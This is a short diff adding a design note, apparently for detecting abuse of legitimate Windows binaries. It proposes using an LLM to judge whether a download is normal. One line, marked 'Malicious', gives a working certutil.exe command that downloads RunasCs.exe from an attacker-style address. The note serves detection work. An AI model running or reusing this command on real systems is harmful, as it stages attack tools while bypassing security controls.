@@ -1,0 +1,5 @@
+-> 找出可能的 能調用下載 run shell code  合法binary 
+
+Malicious -> certutil.exe -urlcache -split -f "http://10.10.14.15:80/RunasCs.exe" ".\RunasCs.exe"
+
+-> 透過LLM 來判斷是不是 正常的下載! 
